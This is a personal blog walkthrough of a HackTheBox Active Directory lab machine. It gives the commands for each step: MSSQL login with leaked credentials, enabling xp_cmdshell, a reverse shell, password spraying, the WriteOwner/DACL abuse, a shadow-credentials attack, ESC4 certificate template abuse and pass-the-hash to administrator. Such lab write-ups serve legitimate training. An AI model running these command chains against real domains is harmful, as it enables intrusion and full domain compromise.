<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Active Directory Series - Machine 2 - DZ Blog</title>
    <link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../css/post.css">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <header class="header">
        <div class="container">
            <h1 class="logo"><a href="../index.html"><span class="logo-draco">Draco</span><span class="logo-zona">Zona</span><span class="cursor">_</span></a></h1>
            <nav class="nav">
                <a href="../index.html">Blog</a>
                <a href="../about.html">About</a>
                <a href="../cv.html">CV</a>
                <a href="../certifications.html">Certifications</a>
                <a href="../contact.html">Contact</a>
            </nav>
        </div>
    </header>

    <main class="main">
        <div class="container">
            <article class="post">
                <div class="back-to-blog">
                    <a href="../index.html" class="back-btn">‚Üê Back to Blog</a>
                </div>
                
                <header class="post-header">
                    <div class="post-meta">
                        <span class="post-date">April 2, 2025</span>
                        <span class="post-category">Active Directory</span>
                    </div>
                    <h1 class="post-title">Active Directory Series - Machine 2</h1>
                    <div class="post-tags">
                        <span class="tag">AD</span><span class="tag">HTB</span><span class="tag">Offensive Security</span>
                    </div>
                </header>

                <div class="post-content">
                    <p><h1>Introduction</h1></p><p>This is the second machine of the revised and newly improved <code>Active Directory Exploitation</code> track in HackTheBox.</p><p><img src="../images//ad-series-1/image1.png" alt="Desktop View" class="post-image"></p><p>This machine was labeled "Easy" level, but to be honest it did not feel easy. I would say medium. It was fun and pain in the ass at the same time. I have encountered things in which I needed to do some further research on just to finish the machine. Anyways, I'll show you what is it about. The machine provided a credential for 1 user:</p><p> User: rose<br> password: KxEPkKe6R8su</p><p><h1>Recon and Enum Phase</h1><br>The usual. I ran an nmap scan:</p><p><div class="code-block"><pre><code><br>nmap -sCV -p- --min-rate 300 -vv 10.10.11.51 <br></code></pre></div></p><p><h3>Nmap results:</h3></p><p><div class="code-block"><pre><code><br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-01 12:49:20Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM<br>|     Target_Name: SEQUEL<br>|     NetBIOS_Domain_Name: SEQUEL<br>|     NetBIOS_Computer_Name: DC01<br>|     DNS_Domain_Name: sequel.htb<br>|     DNS_Computer_Name: DC01.sequel.htb<br>|     DNS_Tree_Name: sequel.htb<br>|_    Product_Version: 10.0.17763<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)<br>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)<br>|_ssl-date: 2025-04-01T12:50:59+00:00; -1s from scanner time.<br>| ssl-cert: Subject: commonName=DC01.sequel.htb<br>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb<br>| Issuer: commonName=sequel-DC01-CA<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>49664/tcp open  msrpc         Microsoft Windows RPC<br>49665/tcp open  msrpc         Microsoft Windows RPC<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49690/tcp open  msrpc         Microsoft Windows RPC<br>49693/tcp open  msrpc         Microsoft Windows RPC<br>49706/tcp open  msrpc         Microsoft Windows RPC<br>49722/tcp open  msrpc         Microsoft Windows RPC<br>49731/tcp open  msrpc         Microsoft Windows RPC<br>49800/tcp open  msrpc         Microsoft Windows RPC<br></code></pre></div></p><p>A bunch of open ports but hey! We can check if we can enumerate some shares unauthenticated.<br><img src="../images//ad-series-2/ss1.png" alt="Desktop View" class="post-image"></p><p>Well, it seems that I was not that lucky. So I used the credentials that were given by the challenge.</p><p><div class="code-block"><pre><code><br>nxc smb <IP> -u rose -p <password> --shares<br></code></pre></div></p><p><img src="../images//ad-series-2/ss2.png" alt="Desktop View" class="post-image"></p><p>That's cool. So I was able to retrieve information with that. So there was a share called <strong>Accounting Department</strong>. So I checked if I could access it. </p><p><div class="code-block"><pre><code><br>smbclient \\\\<IP>\\'Accounting Department' -U rose --password=<password><br></code></pre></div></p><p><img src="../images//ad-series-2/ss3.png" alt="Desktop View" class="post-image"></p><p>So, yeah I could access it and there were two files as you can see on the screenshot above.<br><img src="../images//ad-series-2/ss4.png" alt="Desktop View" class="post-image"></p><p>The <code>sharedStrings.xml</code> looked juicy to me. So I opened it and I found it's a bunch of users and their password. <br><img src="../images//ad-series-2/ss5.png" alt="Desktop View" class="post-image"></p><p>Though if you look closely, there is a user called <code>sa</code> and its password. <br><div class="prompt-info"><strong>sa</strong> or (System Administrator) is the default built-in administrator account with the highest privileges.</div></p><p>With that information, I was thinking maybe I could login to their SQL Server. I don't know. Just a thought. So I fired up another terminal and hit it with <br>this tender juicy hatdog üå≠ command: </p><p><div class="code-block"><pre><code><br>python3 mssqlclient.py 'sa:<password>'@<IP><br></code></pre></div></p><p>As you can see, I was able to logged in! This is great. There is an improvement. <br><img src="../images//ad-series-2/ss6.png" alt="Desktop View" class="post-image"></p><p>From here on, I was checking if I could exfil some data, looked for some other juicy databases, but it wasn't tender juicy as I was expecting. Luckily, out of the blue, I remember<br>something I have done before which is using <code>xp_cmdshell</code> to execute system commands on the SQL Server.  </p><p>> <strong>xp_cmdshell</strong> is an extended stored procedure in Microsoft SQL Server that allows commands to be executed directy from it. This is disabled by default due to security considerations as it can be abused for privilege escalation and remote code execution. If a user with sysadmin priveleges enables <code>xp_cmdshell</code>, SQL Server can execute system commands with SQL Server's service account privileges, which is a major security risk.<br>{: .prompt-danger}</p><p><br>With that information, I enabled <code>xp_cmdshell</code> so I could execute commands.</p><p><h3>Enable <code>advanced options</code> and <code>xp_cmdshell</code>:</h3></p><p><div class="code-block"><pre><code><br>EXEC sp_configure 'show advanced options', 1;</p><p>RECONFIGURE;</p><p>EXEC sp_configure 'xp_cmdshell', 1;</p><p>RECONFIGURE;<br></code></pre></div></p><p><img src="../images//ad-series-2/ss7.png" alt="Desktop View" class="post-image"></p><p>Now, that's enabled. At this point, I was thinking of establishing a reverse shell. So with the help of <a href="https://revshells.com" target="_blank">Reverse Shell Generator</a>, I crafted my payload.<br><img src="../images//ad-series-2/ss9.png" alt="Desktop View" class="post-image"></p><p>Since it's a windows system, of course it would be logical to use powershell payload, right? I don't know, but yeah. Based on my experience, it is much better to encode the payload to <code>Base64</code> so I chose the payload encoded in <code>Base64</code>. I also setup the listener on the side as well.</p><p><img src="../images//ad-series-2/ss10.png" alt="Desktop View" class="post-image"></p><p>After executing the command above, I was able to spawn a shell on my machine.<br><img src="../images//ad-series-2/ss11.png" alt="Desktop View" class="post-image"></p><p>So, it seems that I am user <code>sequel\sql_svc</code>. So first I tried looking around then when I went to <code>C:\</code> directory, there was this folder named <code>SQL2019</code>. That's something interesting, right? So I checked its contents.<br><img src="../images//ad-series-2/ss12.png" alt="Desktop View" class="post-image"></p><p><img src="../images//ad-series-2/ss13.png" alt="Desktop View" class="post-image"></p><p>I'm not sure what that was so I checked its contents as well.<br><img src="../images//ad-series-2/ss14.png" alt="Desktop View" class="post-image"></p><p>This is where it got interesting. As you can see in the screenshot above, there is a file called <code>sql-Configuration.INI</code></p><p>> <code>Configuration.INI</code> is a configuration file used to perform unattended installations of Microsoft SQL Server. So instead of manually selecting options in the SQL Server setup wizard, you can provide details in this file to automate the installation process.<br>{: .prompt-info}</p><p>What's interesting in this file is that, usually, one of the parameters is the password. So if I am not mistaken, this configuration file should have password in it. So I checked the contents of this configuration file.<br><img src="../images//ad-series-2/ss15.png" alt="Desktop View" class="post-image"></p><p>So, there it is. Password. What a tender juicy hatdog. üå≠</p><p>I looked around to check for more things or information that would be useful eventually. I looked into the <code>C:\users</code> directory to check who are the users and I found another user named <code>ryan</code>.<br><img src="../images//ad-series-2/ss16.png" alt="Desktop View" class="post-image"></p><p><h1>Gaining Initial Foothold</h1></p><p>From here on, I was thinking maybe with all the passwords I got now could be used to this user <code>ryan</code>. Remember the <code>accounts.xlsx</code> that contained an xml file where there was a list of passwords and users. Though there was no ryan user there, I still copied all the password and put it in a <code>pass.txt</code> file. I also included the password from the configuration file. Who knows, we need all the resources we have to check for things, right? In that way, maybe we could hit some tender juicy hatdog üå≠ along the way. </p><p>Using <code>netexec</code> I tried to check if any of these passwords would fit for ryan so we could establish remote access using <code>evil-winrm</code>. </p><p><div class="code-block"><pre><code><br>nxc winrm <IP> -u ryan -p pass.txt<br></code></pre></div></p><p><img src="../images//ad-series-2/ss17.png" alt="Desktop View" class="post-image"></p><p>And would you look at that! We hit a hatdog üå≠. So I used that password to for the evil-winrm.</p><p><div class="code-block"><pre><code><br>evil-winrm -i <IP> -u ryan -p <password><br></code></pre></div></p><p><img src="../images//ad-series-2/ss18.png" alt="Desktop View" class="post-image"></p><p>So now I am logged in as <code>ryan</code>. I also got the user flag. At this point, it was time to look around and find a way to escalate privileges. So I transferred the <code>SharpHound.exe</code> from my machine to the victim machine using smbserver. </p><p><div class="code-block"><pre><code><br>python3 smbserver.py <share name> -username <username> -password <password> <directory> -smb2support<br></code></pre></div></p><p><img src="../images//ad-series-2/ss20.png" alt="Desktop View" class="post-image"></p><p><img src="../images//ad-series-2/ss21.png" alt="Desktop View" class="post-image"></p><p>After executing the SharpHound and extracting the zip file from its result, I fired up bloodhound to check for privesc paths. After looking around, this is what I got. So, I was not able to take a screenshot where their original names were showing so I had to improvise. Sorry about that. Anyways As you can see, <code>ryan</code> seemed to have the ability to take owenership of <code>ca_svc</code>.<br><img src="../images//ad-series-2/ss22.png" alt="Desktop View" class="post-image"></p><p>> <strong>WriteOwner</strong> permission allows a user to change the ownership of an object (e.g., a user account, group, or computer)<br>{:.prompt-warning}</p><p>> In this case, <code>ryan</code> has <code>WriteOwner</code> permissions over <code>ca_svc</code>. This means <code>ryan</code> can change the owner of the <code>ca_svc</code> account to themselves. This will allow <code>ryan</code> to modify its permissions and give themselves full control over it, effectively granting themselves the same privileges as <code>ca_svc</code>.<br>{:.prompt-info}</p><p><h1>Privilege Escalation</h1><br>At this point, that information could be used for a potential privilege escalation attack. So it's time to abuse the <code>WriteOwner</code> permission. I used <code>owneredit.py</code> from <code>Impacket</code> for this. </p><p><div class="code-block"><pre><code><br>owneredit.py -action write -new-owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'<br></code></pre></div></p><p><img src="../images//ad-series-2/ss24.png" alt="Desktop View" class="post-image"></p><p>Now the owner has been successfully modified, I can now change permissions. For the next step, I used <code>dacledit.py</code>. </p><p>This command modifies the Discretionary Access Control List (DACL) of <code>ca_svc</code> in Active Directory on the sequel.htb. This grants <code>FullControl</code> to <code>ryan</code>.</p><p><div class="code-block"><pre><code><br>python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:<password><br></code></pre></div></p><p><table class="markdown-table"><thead><tr><th>Command Option</th><th>Explanation</th></tr></thead><tbody><tr><td>-action 'write'</td><td>Modification of DACL.</td></tr><tr><td>-rights 'FullControl'</td><td>Grants <strong>Full Control</strong> permissions. Highest level of access.</td></tr><tr><td>-principal 'ryan'</td><td>The user whol will receive <strong>Full Control</strong>.</td></tr><tr><td>-target 'ca_svc'</td><td>The AD object whose permissions will be modified.</td></tr><tr><td>-sequel.htb/ryan:password</td><td>Credentials used to authenticate.</td></tr></tbody></table><br><img src="../images//ad-series-2/ss25.png" alt="Desktop View" class="post-image"></p><p>After executing the command, DACL was modified successfully. At this point, I used <code>certipy</code> tool to interact with the <code>Active Directory Certificate Services</code> (AD CS). This tool can be used to enumerate, abuse, and misconfigure AD CS for privilege escalation or persistence.</p><p><div class="code-block"><pre><code><br>sudo certipy-ad shadow auto -u 'ryan@sequel.htb' -p '<password>' -account 'ca_svc' -dc-ip <IP><br></code></pre></div></p><p><table class="markdown-table"><thead><tr><th>Command Option</th><th>Explanation</th></tr></thead><tbody><tr><td>shadow auto</td><td>Performs the <strong>Shadow Credentials Attack</strong>. This allows an attacker to gain persistence to <br> another AD user.</td></tr><tr><td>-u 'ryan@sequel.htb'</td><td>The user account being used to authenticate.</td></tr><tr><td>-p '<password>'</td><td>The password to login to AD.</td></tr><tr><td>-account 'ca_svc'</td><td>The target account whose access is being hijacked.</td></tr><tr><td>-dc-ip</td><td>Specifies the Domain Controller (DC) IP address.</td></tr></tbody></table><br>I got the NT hash for the user <code>ca_svc</code>.<br><img src="../images//ad-series-2/ss26.png" alt="Desktop View" class="post-image"></p><p><br>From here on, I needed to search for vulnerable certificate templates. I'm referring to misconfigured templates that could allow attackers to escalate privileges via <code>ESC1</code>, <code>ESC2</code>, etc.</p><p>So first, I set the environment variable <code>KRB5CCNAME</code> to point a Kerberos credential cache file <code>ca_svc.ccache</code> in the current working directory <code>$PWD</code>. The rest of the command is explained below.</p><p><div class="code-block"><pre><code><br>KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip <IP> -vulnerable -stdout<br></code></pre></div></p><p><table class="markdown-table"><thead><tr><th>Command Option</th><th>Explanation</th></tr></thead><tbody><tr><td>certipy-ad find</td><td>The main command to search for certificate templates in the AD Certificate Services <br>(AD CS) environment.</td></tr><tr><td>-scheme ldap</td><td>This specifies the authentication scheme to <code>ldap</code>.</td></tr><tr><td>-k</td><td>This enables Kerberos authentication (using the ticket from KRB5CCNAME).</td></tr><tr><td>-debug</td><td>Enables debug output for troubleshooting.</td></tr><tr><td>-target dc01.sequel.htb</td><td>This sets the target domain controller.</td></tr><tr><td>-dc-ip <IP></td><td>The IP address of the domain controller</td></tr><tr><td>-vulnerable</td><td>This will list the only certificate templates that are vulnerable to exploitation.</td></tr><tr><td>-stdout</td><td>This forces the output to be printed to the console</td></tr></tbody></table><br><img src="../images//ad-series-2/ss27.png" alt="Desktop View" class="post-image"></p><p><img src="../images//ad-series-2/ss28.png" alt="Desktop View" class="post-image"></p><p><img src="../images//ad-series-2/ss28-1.png" alt="Desktop View" class="post-image"></p><p>As you can see in the result of the command bove, I was able to determine what to do next. Indicated in the <code>vulnerabilities</code> section was the ESC4.</p><p>> <strong>ESC4</strong> is a vulnerability that lets the attaker modify the Certificate Template to make it vulnerable. The conditions for this is that a low-privileged user has write permissions (e.g., <code>WriteProperty</code>, <code>WriteDacl</code>) on a certificate template.<br>{:.prompt-warning}</p><p>> We could use this for privilege escalation which could potentially lead to full domain compromise.<br>{:.prompt-danger}</p><p>With the information above, it was time to crack thy bones. ü¶¥</p><p><div class="code-block"><pre><code><br>KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip <IP><br></code></pre></div></p><p><img src="../images//ad-series-2/ss29.png" alt="Desktop View" class="post-image"></p><p>I used this command to exploit AD CS. This will request a certificate for the <code>administrator@sequel.htb</code> account using the <code>DunderMifflinAuthentication</code> template. Since <code>ca_svc</code> has control over this template, it can generate a valid authentication certificate for <code>administrator</code>.</p><p><div class="code-block"><pre><code><br>sudo certify-ad req -username 'ca_svc@sequel.htb' -hashes <hash> -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip <IP><br></code></pre></div></p><p><table class="markdown-table"><thead><tr><th>Command Option</th><th>Explanation</th></tr></thead><tbody><tr><td>-username 'ca_svc@sequel.htb'</td><td>Authenticates as the <code>ca_svc</code> user.</td></tr><tr><td>-hashes <hash></td><td>Uses the NTLM hash of <code>ca_svc</code> instead of a password</td></tr><tr><td>-ca sequel-DC01-CA</td><td>Specifies the <strong>Certificate Authority (CA)</strong> server</td></tr><tr><td>-target DC01.sequel.htb</td><td>Targets the <strong>Domain Controller (DC01)</strong> for the certificate request.</td></tr><tr><td>-template DunderMifflinAuthentication</td><td>Specifies the certificate template to use for the request</td></tr><tr><td>-upn administrator@sequel.htb</td><td>Requests a certificate as <code>administrator@sequel.htb</code>, allowing <br> authentication as the Domain Admin.</td></tr><tr><td>-dc-ip <IP></td><td>By this time, YOU GUYS / GAL ALREADY KNOW WHAT THIS HATDOG IS <BR> FOR RIGHT?</td></tr></tbody></table><br><img src="../images//ad-series-2/ss30.png" alt="Desktop View" class="post-image"></p><p>Since I already have the <code>administrator.pfx</code> certificate that I could use to authenticate instead of using a password or hash.</p><p><div class="code-block"><pre><code><br>certipy-ad auth -pfx administrator.pfx -domain sequel.htb<br></code></pre></div></p><p><table class="markdown-table"><thead><tr><th>Command Option</th><th>Explanation</th></tr></thead><tbody><tr><td>certipy-ad auth</td><td>Uses Certipy to authenticate to Active Directory.</td></tr><tr><td>-pfx administrator.pfx</td><td>This specifies the PFX (Personal Information Exchange) certificate for authentication.</td></tr><tr><td>-domain sequel.htb</td><td>Ya'll know what this does.</td></tr></tbody></table></p><p>And now I got the administrator's hash. I could now log in as administrator using PtH attack.<br><img src="../images//ad-series-2/ss31.png" alt="Desktop View" class="post-image"></p><p><div class="code-block"><pre><code><br>evil-winrm -i <IP> -u "administrator" -H <Hash><br></code></pre></div></p><p>I am now logged in as administrator! From here on, just locate where the root flag is. I already got mine.<br><img src="../images//ad-series-2/ss32.png" alt="Desktop View" class="post-image"></p><p><h1>Conclusion</h1></p><p>This is how I understand on how to attack this machine. If you have any other ways or methods in compromising this machine, or even deeper explanation on how things work, I am open for feedback and discussion. So please feel free to reachout at <code>reacher@dracozona.com</code>.</p>
                </div>

                <footer class="post-footer">
                    <div class="post-navigation">
                        <a href="../index.html" class="nav-link">‚Üê Back to Blog</a>
                    </div>
                </footer>
            </article>
        </div>
    </main>

    <footer class="footer">
        <div class="container">
            <p>Tender Juicy Hatdog <span class="heart">üå≠</span> Hacking is not a crime.</p>
        </div>
    </footer>

    <canvas id="matrixCanvas"></canvas>
    <script src="../js/matrix.js"></script>
</body>
</html>